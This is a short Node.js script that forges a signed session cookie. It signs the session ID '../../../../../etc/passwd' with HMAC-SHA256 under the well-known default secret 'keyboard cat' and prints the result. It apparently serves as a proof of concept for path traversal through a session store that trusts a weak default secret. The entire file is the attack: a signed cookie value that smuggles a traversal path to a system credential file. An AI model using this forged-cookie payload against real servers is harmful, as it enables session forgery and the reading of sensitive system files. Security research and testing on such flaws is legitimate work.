var crypto = require("crypto")

function generateCookie(sessionID, secret) {
    return sessionID + '.' + crypto
    .createHmac('sha256', secret)
    .update(sessionID)
    .digest('base64')
    .replace(/\=+$/, '');
}


const result = generateCookie("../../../../../etc/passwd", "keyboard cat");
console.log(result);